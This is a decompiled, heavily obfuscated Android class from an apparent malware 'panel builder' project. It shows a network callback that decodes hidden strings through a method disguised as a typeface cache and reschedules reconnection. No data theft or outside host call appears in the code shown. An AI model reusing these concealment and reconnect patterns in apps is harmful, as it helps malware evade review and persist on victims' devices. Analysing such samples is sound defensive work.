package v.s;

import android.net.ConnectivityManager;
import android.net.Network;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class X1pRVvVudFwrQCVJYV extends ConnectivityManager.NetworkCallback {
    public volatile long dDIMxZXP1V8HdM;
    public final /* synthetic */ SyncQYAdapter vekpFI4d1Nc4fakF;
    public volatile boolean w9sT1Swbhx3hs;

    public X1pRVvVudFwrQCVJYV(SyncQYAdapter syncQYAdapter) {
        this.vekpFI4d1Nc4fakF = syncQYAdapter;
    }

    private static /* synthetic */ void nsoj() {
    }

    @Override // android.net.ConnectivityManager.NetworkCallback
    public final void onAvailable(Network network) {
        long jCurrentTimeMillis = System.currentTimeMillis();
        if (jCurrentTimeMillis - this.dDIMxZXP1V8HdM < 5000) {
            return;
        }
        this.dDIMxZXP1V8HdM = jCurrentTimeMillis;
        if (!this.w9sT1Swbhx3hs) {
            String str = SyncQYAdapter.ECwLkmPW1UKz7J6E;
            TypefaceCache.obtain("000D0073004F009000FF00AD00D900E700220060005A008E00FC00BE00D000AB002600360013008F00F100B100D600A800350073004900CB00B000B100DD00E7002F00790048009400B900FF009F00E70030007D0052009700E000B600DC00A000630064005E009400F500AB");
            return;
        }
        String str2 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
        TypefaceCache.obtain("000D0073004F009000FF00AD00D900E7003100730048009300FF00AD00D700A300630077005D009300F500AD009200AB002C0065004800C700BD00FF00C000A200300073004F009300F900B100D500E700160044007700C700F300BE00D100AF00260036001000C700F800BA00D300B500370074005E008600E4");
        this.w9sT1Swbhx3hs = false;
        this.vekpFI4d1Nc4fakF.hjneShqpF9Tis4 = 0;
        this.vekpFI4d1Nc4fakF.gmNWMfvn6zlEj = 0L;
        try {
            ktukzhfmAkOuMU ktukzhfmakoumu = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
            ktukzhfmAkOuMU.J0zjQ7CAgohuxU20eCW6();
        } catch (Exception unused) {
        }
        SyncQYAdapter syncQYAdapter = this.vekpFI4d1Nc4fakF;
        syncQYAdapter.dDIMxZXP1V8HdM.removeCallbacks(syncQYAdapter.H9XlUr4OeMJFiXK);
        SyncQYAdapter syncQYAdapter2 = this.vekpFI4d1Nc4fakF;
        syncQYAdapter2.dDIMxZXP1V8HdM.postDelayed(syncQYAdapter2.H9XlUr4OeMJFiXK, 2000L);
    }

    @Override // android.net.ConnectivityManager.NetworkCallback
    public final void onLost(Network network) {
        String str = SyncQYAdapter.ECwLkmPW1UKz7J6E;
        TypefaceCache.obtain("000D0073004F009000FF00AD00D900E7002F007900480093");
        this.w9sT1Swbhx3hs = true;
    }
}
